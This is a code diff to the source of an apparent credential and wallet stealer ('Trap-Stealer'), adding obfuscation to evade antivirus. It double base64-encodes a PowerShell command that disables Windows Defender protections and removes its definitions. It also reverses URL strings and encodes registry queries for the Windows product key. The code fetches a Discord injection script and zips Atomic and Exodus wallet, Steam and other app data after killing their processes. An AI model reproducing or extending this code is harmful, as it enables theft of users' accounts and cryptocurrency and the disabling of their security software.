@@ -143,9 +143,10 @@ def self_delete():
         os.remove(__file__)
     except Exception as e:
         error_Handler(e)
-def Disable_Defender():
+def Disa_Def():
     try:
-        cmd = b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
+        cmd = b64decode(b'Y0c5M1pYSnphR1ZzYkNCVFpYUXRUWEJRY21WbVpYSmxibU5sSUMxRWFYTmhZbXhsU1c1MGNuVnphVzl1VUhKbGRtVnVkR2x2YmxONWMzUmxiU0FrZEhKMVpTQXRSR2x6WVdKc1pVbFBRVlpRY205MFpXTjBhVzl1SUNSMGNuVmxJQzFFYVhOaFlteGxVbVZoYkhScGJXVk5iMjVwZEc5eWFXNW5JQ1IwY25WbElDMUVhWE5oWW14bFUyTnlhWEIwVTJOaGJtNXBibWNnSkhSeWRXVWdMVVZ1WVdKc1pVTnZiblJ5YjJ4c1pXUkdiMnhrWlhKQlkyTmxjM01nUkdsellXSnNaV1FnTFVWdVlXSnNaVTVsZEhkdmNtdFFjbTkwWldOMGFXOXVJRUYxWkdsMFRXOWtaU0F0Um05eVkyVWdMVTFCVUZOU1pYQnZjblJwYm1jZ1JHbHpZV0pzWldRZ0xWTjFZbTFwZEZOaGJYQnNaWE5EYjI1elpXNTBJRTVsZG1WeVUyVnVaQ0FtSmlCd2IzZGxjbk5vWld4c0lGTmxkQzFOY0ZCeVpXWmxjbVZ1WTJVZ0xWTjFZbTFwZEZOaGJYQnNaWE5EYjI1elpXNTBJRElnSmlBaUpWQnliMmR5WVcxR2FXeGxjeVZjVjJsdVpHOTNjeUJFWldabGJtUmxjbHhOY0VOdFpGSjFiaTVsZUdVaUlDMVNaVzF2ZG1WRVpXWnBibWwwYVc5dWN5QXRRV3hz')
+        cmd = b64decode(cmd).decode()
         subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     except Exception as e:
         error_Handler(e)
@@ -168,7 +169,7 @@ def check_ip():
     ]
     while True:
         try:
-            response = requests.get("https://checkip.amazonaws.com/")
+            response = requests.get("/moc.swanozama.pikcehc//:sptth"[::-1]) # AmazonCheckIp
             ip_address = response.content.decode()
             if ip_address in blacklisted[::-1]:
                 exit_program('Blacklisted IP')
@@ -672,7 +673,7 @@ def idisc():
         ind = "sj.xedni"
         global webhook
 
-        inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"
+        inj_url = f"https://raw.{"tnetnocresubuhtig"[::-1]}.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"
 
         folder_list = [f'{Desc}', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
         for folder_name in folder_list:
@@ -757,13 +758,15 @@ def run_command(command):
 
 def get_product_key():
     try:
-        return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault")
+        data = b64decode(b'cG93ZXJzaGVsbCBHZXQtSXRlbVByb3BlcnR5VmFsdWUgLVBhdGggJ0hLTE06U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb25cXFNvZnR3YXJlUHJvdGVjdGlvblBsYXRmb3JtJyAtTmFtZSBCYWNrdXBQcm9kdWN0S2V5RGVmYXVs').decode()
+        return run_command(data)
     except Exception as e:
         error_Handler(e)
         return "Couldn't get Product Name"
 def get_product_name():
     try:
-        return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")
+        data = b64decode(b'cG93ZXJzaGVsbCBHZXQtSXRlbVByb3BlcnR5VmFsdWUgLVBhdGggJ0hLTE06U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb24nIC1OYW1lIFByb2R1Y3ROYW1l').decode()
+        return run_command(data)
     except Exception as e:
         error_Handler(e)
         return "Couldn't get Product Name"
@@ -2226,7 +2229,15 @@ def Bypass_Better_Discord():
             f.write(content)
     except Exception as e:
         error_Handler(e)
-
+def close_process(procc):
+    if close_proc == True:
+        try:
+            subprocess.Popen(f'''ta"sk"ki"ll /im {procc} /t /f >nul 2>&1''', shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return True
+        except Exception as e:
+            error_Handler(e)
+            return False
+        
 def ZipTelegram(path, arg, procc):
     try:
         global OtherZip
@@ -2235,7 +2246,7 @@ def ZipTelegram(path, arg, procc):
         if not os.path.exists(pathC):
             return
 
-        subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+        close_process(procc)
 
         with ZipFile(f"{pathC}/{name}.zip", "w") as zf:
             files = [file for file in os.listdir(pathC) if not (
@@ -2253,14 +2264,7 @@ def ZipTelegram(path, arg, procc):
     except Exception as e:
         error_Handler(e)
     
-def close_process(procc):
-    if close_proc == True:
-        try:
-            subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
-            return True
-        except Exception as e:
-            error_Handler(e)
-            return False
+
         
     
 
@@ -3320,7 +3324,8 @@ def gatha():
         
     ]
     PathsToZip = [
-        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
+
+        [f"{roaming}/atomic/Local Storage/leveldb", "Atomic Wallet.exe", "Wallet"],
         [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
         ["C:\\Program Files (x86)\\Steam\\config", "steam.exe", "Steam"],
         [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
@@ -3330,7 +3335,7 @@ def gatha():
     First_Thread = []
     Second_Thread = []
     try:
-        defender = threading.Thread(target=Disable_Defender)
+        defender = threading.Thread(target=Disa_Def)
         defender.start()
         Second_Thread.append(defender)
     except Exception as e:
